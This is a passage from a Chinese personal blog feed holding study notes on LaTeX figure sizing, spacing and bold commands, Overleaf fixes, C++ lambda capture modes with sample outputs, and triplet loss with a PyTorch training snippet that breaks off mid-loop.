class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">\begin</span>&#123;figure&#125;[htb]</span><br><span class="line">  <span class="keyword">\centering</span></span><br><span class="line">  <span class="keyword">\includegraphics</span>[width=0.5<span class="keyword">\linewidth</span>]&#123;fig2.png&#125;</span><br><span class="line">  <span class="keyword">\caption</span>&#123;图片的解释&#125;</span><br><span class="line"><span class="keyword">\end</span>&#123;figure&#125;</span><br></pre></td></tr></table></figure><p>其中，width=0.5[linewidth](<a href="https://so.csdn.net/so/search?q=linewidth&amp;spm=1001.2101.3001.7020">https://so.csdn.net/so/search?q=linewidth&amp;spm=1001.2101.3001.7020</a>) 表明将插入的图像等比例缩小至0.6倍。经验证，调整比例后图像成功地缩小了。</p><p>这样可以适应模板 自动地调整大小 不用手动去调整长宽 非常好用</p><h1 id="4空格">4.空格</h1><p>quad空格a \quad b一个m的宽度<br>大空格a\ b1/3m宽度<br>中等空格a;b2/7m宽度<br>小空格a,b1/6m宽度<br>没有空格ab<br>紧贴a!b缩进1/6m宽度</p><h1 id="5latex的粗体">5.latex的粗体</h1><p>latTx的粗体一般用以下命令：</p><p>\textbf{}：文本环境加粗。在数学环境使用的话，会使斜体效果消失。并且无法输出加粗的希腊字母。</p><p>\mathbf{}：会变为粗体，但同样会导致数学字母斜体形式的丢失。 \boldmath{}：数学环境里可以加粗且不会使斜体消失。需要添加amsmath宏包。 \boldsymbol{}：可以对希腊字母加粗。需要添加amsmath宏包。 在数学环境中，比较推荐的方式是添加宏包\usepackage{bm}, 使用\bm{}命令加粗。</p><p>但是在xelatex或Luatex引擎的unicode-math环境中中，\bm{}会报错。此时，可以使用以下命令：</p><p>\symbfit{}：加粗，且有斜体效果 \symbf{}：加粗，没有斜体效果 \mathbfcal{}：加粗的\mathcal字体</p><p>[<a href="https://blog.csdn.net/xovee/article/details/106325136">翻译] [Overleaf] LaTeX 中的粗体、斜体、下划线_latex 斜体-CSDN博客</a></p><h1 id="6图片与引用">6.图片与引用</h1><p>示例：</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">\begin</span>&#123;figure*&#125;</span><br><span class="line"><span class="keyword">\centering</span></span><br><span class="line"><span class="keyword">\includegraphics</span>[scale=0.45]&#123;double<span class="built_in">_</span>single.eps&#125; <span class="comment">%scale=缩小比例，或者用width=2in</span></span><br><span class="line"><span class="keyword">\caption</span>&#123;Search&#125;     <span class="keyword">\label</span>&#123;fig:ss&#125;</span><br><span class="line"><span class="keyword">\end</span>&#123;figure*&#125;</span><br></pre></td></tr></table></figure><p>引用注意</p><p>\label{} 必须写在 \caption{} 的后面。</p><p>\ref{}:引用</p><p>\ref{fig:ss}, 即\ref{}, {}内为标签名称,我这里的标签名称是：fig:ss</p><h1 id="7宽度问题">7.宽度问题</h1><p>\hsize: 是 Latex中定义的长度，是一种叫做水平盒子的长度，它的主要作用是告诉TeX系统什么时候换行。所以大部分时候和\textwidth是一致的，但是在分栏状况下，\hsize只是栏的宽度；</p><p>\textwidth: 是 Latex中定义的长度，等效于\hsize，并且是固定不变的，可以理解为一行文字的宽度。</p><p>\pagewidth: 包含了页边的宽度，比\textwidth要大</p><p>\linewidth: 这指得是目前环境的宽度，是依赖于上下文的一个宽度值，例如新建了一个box，在这个box中，</p><p>\linewidth是box中文字的宽度。再例如minipage环境中，\linewidth就和这个minipage的大小有关.</p><p>\columnwidth: 如果文章分栏的话，这个宽度就是每一栏的宽度。</p>]]></content>
      
      
      <categories>
          
          <category> Manuscripts </category>
          
      </categories>
      
      
        <tags>
            
            <tag> overleaf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>overleaf 问题</title>
      <link href="/2023/12/16/Manuscripts/overleaf/overleaf%E9%97%AE%E9%A2%98%20/"/>
      <url>/2023/12/16/Manuscripts/overleaf/overleaf%E9%97%AE%E9%A2%98%20/</url>
      
        <content type="html"><![CDATA[<h1 id="algorithm最后出现0">algorithm最后出现=0</h1><p><strong>解决方法：</strong></p><p>注释掉&quot;\usepackage{algpseudocode}&quot;</p><p>因为<code>\usepackage&#123;algpseudocode&#125; %This introduces extra zero at the end of algorithm</code></p><h1 id="table位置问题">table位置问题</h1><p>如果table默认置顶，在.sty文件中定义了table环境，那么可尝试将</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\begin&#123;table&#125;[h] </span><br></pre></td></tr></table></figure><p>改为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\begin&#123;table&#125;[pos=h] </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Manuscripts </category>
          
      </categories>
      
      
        <tags>
            
            <tag> overleaf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Computers&amp;Security</title>
      <link href="/2023/12/16/Manuscripts/sci/Computers&amp;Security/"/>
      <url>/2023/12/16/Manuscripts/sci/Computers&amp;Security/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www2.cloud.editorialmanager.com/cose/default2.aspx">Editorial Manager®</a></p>]]></content>
      
      
      <categories>
          
          <category> Manuscripts </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sci投稿 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++ lamda表达式</title>
      <link href="/2023/12/16/Programmer/c-c++/lambda/"/>
      <url>/2023/12/16/Programmer/c-c++/lambda/</url>
      
        <content type="html"><![CDATA[<p>创建一个匿名函数并执行。Objective-C采用的是上尖号^，而C++ 11采用的是配对的方括号[]。实例如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    []&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Hello,Worldn&quot;</span>; </span><br><span class="line">    &#125;();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们也可以方便的将这个创建的匿名函数赋值出来调用：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">1024</span>;</span><br><span class="line">    <span class="keyword">auto</span> func = [](<span class="type">int</span> i) &#123; <span class="comment">// (int i) 是指传入改匿名函数的参数</span></span><br><span class="line">        cout &lt;&lt; i;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="built_in">func</span>(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="捕获选项">捕获选项</h1><ul><li>[] Capture nothing (or, a scorched earth strategy?)</li><li>[&amp;] Capture any referenced variable by reference</li><li>[=] Capture any referenced variable by making a copy</li><li>[=, &amp;foo] Capture any referenced variable by making a copy, but capture variable foo by reference</li><li>[bar] Capture bar by making a copy; don’t copy anything else</li><li>[this] Capture the this pointer of the enclosing class</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">-[]不捕获任何变量</span><br><span class="line"></span><br><span class="line">-[&amp;]通过引用捕获任何引用变量</span><br><span class="line"></span><br><span class="line">-[=]通过复制捕获任何引用变量</span><br><span class="line"></span><br><span class="line">-[=，&amp;foo]通过复制捕获任何引用的变量，但通过引用捕获变量foo</span><br><span class="line"></span><br><span class="line">-[bar]通过复制来捕获bar；不要复制其他任何东西</span><br><span class="line"></span><br><span class="line">-[this]捕获封闭类的this指针</span><br></pre></td></tr></table></figure><h1 id="不捕获任何变量">[] 不捕获任何变量</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">1024</span>;</span><br><span class="line">    <span class="keyword">auto</span> func = [] &#123; cout &lt;&lt; i; &#125;;</span><br><span class="line">    <span class="built_in">func</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>vs 报错<br>error C3493: 无法隐式捕获“i”，因为尚未指定默认捕获模式<br>error C2064: 项不会计算为接受 0 个参数的函数</p><p>g++ 报错：<br>error: ‘i’ is not captured</p><p>要直接沿用外部的变量需要在 [] 中指名捕获。</p><h1 id="拷贝捕获">[=] 拷贝捕获</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">1024</span>;</span><br><span class="line">    <span class="keyword">auto</span> func = [=]&#123;  <span class="comment">// [=] 表明将外部的所有变量拷贝一份到该函数内部</span></span><br><span class="line">        cout &lt;&lt; i;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="built_in">func</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果：<br>1024</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">1024</span>;</span><br><span class="line">    <span class="keyword">auto</span> fun1 = [=]&#123;</span><br><span class="line">        <span class="comment">// fun1 内存在 i</span></span><br><span class="line">        cout &lt;&lt; i; <span class="comment">// 1024</span></span><br><span class="line">        <span class="keyword">auto</span> fun2 = []&#123; <span class="comment">// 未指名捕获， i 不存在</span></span><br><span class="line">            cout &lt;&lt; i;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="built_in">fun2</span>();</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="built_in">fun1</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="引用捕获">[&amp;] 引用捕获</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">1024</span>;</span><br><span class="line">    cout &lt;&lt; &amp;i &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">auto</span> fun1 = [&amp;]&#123;</span><br><span class="line">        cout &lt;&lt; &amp;i &lt;&lt; endl;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="built_in">fun1</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果:<br>0x28ff0c<br>0x28ff0c</p><h1 id="拷贝与引用混合">[=, &amp;] 拷贝与引用混合</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">1024</span>, j = <span class="number">2048</span>;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;i:&quot;</span> &lt;&lt; &amp;i &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;j:&quot;</span> &lt;&lt; &amp;j &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">auto</span> fun1 = [=, &amp;i]&#123; <span class="comment">// 默认拷贝外部所有变量，但引用变量 i</span></span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;i:&quot;</span> &lt;&lt; &amp;i &lt;&lt; endl;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;j:&quot;</span> &lt;&lt; &amp;j &lt;&lt; endl;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="built_in">fun1</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果<br>outside i:0x28ff0c<br>outside j:0x28ff08<br>inside i:0x28ff0c<br>inside j:0x28ff04</p><h1 id="bar-指定引用或拷贝">[bar] 指定引用或拷贝</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">1024</span>, j = <span class="number">2048</span>;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;outside i value:&quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot; addr:&quot;</span> &lt;&lt; &amp;i &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">auto</span> fun1 = [i]&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;inside  i value:&quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot; addr:&quot;</span> &lt;&lt; &amp;i &lt;&lt; endl;</span><br><span class="line">        <span class="comment">// cout &lt;&lt; j &lt;&lt; endl; // j 未捕获</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="built_in">fun1</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果：<br>outside i value:1024 addr:0x28ff08<br>inside i value:1024 addr:0x28ff04</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">1024</span>, j = <span class="number">2048</span>;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;outside i value:&quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot; addr:&quot;</span> &lt;&lt; &amp;i &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">auto</span> fun1 = [&amp;i]&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;inside  i value:&quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot; addr:&quot;</span> &lt;&lt; &amp;i &lt;&lt; endl;</span><br><span class="line">        <span class="comment">// cout &lt;&lt; j &lt;&lt; endl; // j 未捕获</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="built_in">fun1</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果：<br>outside i value:1024 addr:0x28ff08<br>inside i value:1024 addr:0x28ff08</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">1024</span>, j = <span class="number">2048</span>, k;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;outside i:&quot;</span> &lt;&lt; &amp;i &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;outside j:&quot;</span> &lt;&lt; &amp;j &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">auto</span> fun1 = [i, &amp;j]&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;inside  i:&quot;</span> &lt;&lt; &amp;i &lt;&lt; endl;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;inside  j:&quot;</span> &lt;&lt; &amp;j &lt;&lt; endl;</span><br><span class="line">        <span class="comment">// cout &lt;&lt; k; // k 未捕获</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="built_in">fun1</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果：<br>outside i:0x28ff0c<br>outside j:0x28ff08<br>inside i:0x28ff00<br>inside j:0x28ff08</p><h1 id="this-捕获-this-指针">[this] 捕获 this 指针</h1><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#include &lt;iostream&gt;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="title">std</span>;</span><br><span class="line"><span class="keyword">class</span> <span class="title">test</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">hello</span>()</span> &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;test hello!n&quot;</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">lambda</span>()</span> &#123;</span><br><span class="line">        auto fun = [<span class="keyword">this</span>]&#123; <span class="comment">// 捕获了 this 指针</span></span><br><span class="line">            <span class="keyword">this</span>-&gt;hello(); <span class="comment">// 这里 this 调用的就是 class test 的对象了</span></span><br><span class="line">        &#125;;</span><br><span class="line">        fun();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="built_in">int</span> <span class="title">main</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    test t;</span><br><span class="line">    t.lambda();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> C/C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Triplet Loss</title>
      <link href="/2023/10/10/AILearning/DL/Triplet-Loss/"/>
      <url>/2023/10/10/AILearning/DL/Triplet-Loss/</url>
      
        <content type="html"><![CDATA[<h1 id="triplet-loss">Triplet Loss</h1><h2 id="aside-tripletloss案例"><aside><br>💡 TripletLoss案例</h2><p><a href="https://zhuanlan.zhihu.com/p/462539667">【对比学习】| Triplet loss</a></p><p><a href="https://www.jianshu.com/p/f97fab0d5989?hmsr=toutiao.io&amp;utm_medium=toutiao.io&amp;utm_source=toutiao.io">MXNet/Gluon 中 Triplet Loss 算法</a></p><p><strong>1.什么是triplet loss 损失函数？</strong></p><p>triplet loss 是深度学习的一种损失函数，主要是用于训练差异性小的样本，比如人脸，细粒度分类等；其次在训练目标是得到样本的embedding任务中，triplet loss 也经常使用，比如文本、图片的embedding。本文主要讨论，对于训练样本差异小的问题。</p><p><strong>2.tripletloss原理</strong></p><p>损失函数公式：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242019722.webp" alt="https://pic1.zhimg.com/80/v2-90daccead9843f3bf5b1489e58dbd578_720w.webp"></p><p>。输入是一个三元组，包括锚（Anchor）示例、正（Positive）示例、负（Negative）示例，通过优化锚示例与正示例的距离小于锚示例与负示例的距离，实现样本之间的相似性计算。a：anchor，锚示例；p：positive，与a是同一类别的样本；n：negative，与a是不同类别的样本；margin是一个大于0的常数。最终的优化目标是拉近a和p的距离，拉远a和n的距离。其中样本可以分为三类：</p><p>**easy triplets：**即</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242019709.webp" alt="https://pic2.zhimg.com/80/v2-dd0386738a3604977a84ea8eb7487a21_720w.webp"></p><p>，这种情况不需要优化，天然a和p的距离很近，a和n的距离很远，如下图：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242019727.webp" alt="https://pic1.zhimg.com/80/v2-ad02e580b107eae95d8feedcd1cfc50c_720w.webp"></p><p>easy triplets示例</p><p>**hard triplets：**即d(a,n)&lt;d(a,p)</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242019682.webp" alt="https://pic4.zhimg.com/80/v2-c0f8f2ddcb833953d4746f5cab18b3db_720w.webp"></p><p>，a和n的距离近，a和p的距离远，这种情况损失最大，需要优化，如下图：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242019720.webp" alt="https://pic1.zhimg.com/80/v2-0e26c64925ef2bcb9806eaf18c2aad0c_720w.webp"></p><p>hard triplets示例</p><p>**semi-hard triplets：**即</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242019718.png" alt="https://pic3.zhimg.com/80/v2-e4dfc15a84b8f0c2edfcb0943bf3895e_720w.webp"></p><p>，即a和p的距离比a和n的距离近，但是近的不够多，不满足margin，这种情况存在损失，但损失比hard triplets要小，也需要优化，如下图：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242019984.webp" alt="https://pic2.zhimg.com/80/v2-a84e1ad1b49496a5806c14613f662b31_720w.webp"></p><p>semi-hard triplets示例</p><p><strong>3.Margin的作用</strong></p><ul><li><p>避免模型走捷径，将negative和positive的embedding训练成很相近，因为如果没margin，triplets loss公式就变成了，那么只要就可以满足上式，也就是锚点a和正例p与锚点a和负例n的距离一样即可，这样模型很难正确区分正例和负例。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242019027.webp" alt="https://pic4.zhimg.com/80/v2-94655266dc5db1158df340927e4e8f3f_720w.webp"></p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242019017.png" alt="https://pic2.zhimg.com/80/v2-656b1ac96526f9140a11ae0c021e36d1_720w.webp"></p></li><li><p>设定一个margin常量，可以迫使模型努力学习，能让锚点a和负例n的distance值更大，同时让锚点a和正例p的distance值更小。</p></li><li><p>由于margin的存在，使得triplets loss多了一个参数，margin的大小需要调参。如果margin太大，则模型的损失会很大，而且学习到最后，loss也很难趋近于0，甚至导致网络不收敛，但是可以较有把握的区分较为相似的样本，即a和p更好区分；如果margin太小，loss很容易趋近于0，模型很好训练，但是较难区分a和p。</p></li></ul><p>在训练的时候，一个重要的选择就是对于负样本进行挑选。称之为，负样本选择或者三元组采集(triplet mining)。一个原则时，easy triplet应该尽量避免被采集到，因为loss为0，所以对训练并没有贡献。</p><h2 id="triplet-loss使用案例">Triplet Loss使用案例</h2><hr><p>在此任务中使用Triplet Loss，可以通过以下方式实现模型：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">import</span> torch.optim <span class="keyword">as</span> optim</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyModel</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, input_size, hidden_size, output_size</span>):</span><br><span class="line">        <span class="built_in">super</span>(MyModel, self).__init__()</span><br><span class="line">        self.input_size = input_size</span><br><span class="line">        self.hidden_size = hidden_size</span><br><span class="line">        self.output_size = output_size</span><br><span class="line">        self.fc1 = nn.Linear(input_size, hidden_size)</span><br><span class="line">        self.fc2 = nn.Linear(hidden_size, output_size)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        x = F.relu(self.fc1(x))</span><br><span class="line">        x = self.fc2(x)</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line">model = MyModel(input_size=<span class="number">10</span>, hidden_size=<span class="number">5</span>, output_size=<span class="number">2</span>)</span><br><span class="line">triplet_loss = nn.TripletMarginLoss(margin=<span class="number">1.0</span>, p=<span class="number">2</span>)</span><br><span class="line">optimizer = optim.SGD(model.parameters(), lr=<span class="number">0.001</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Training loop</span></span><br><span class="line"><span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(num_epochs):</span><br><span 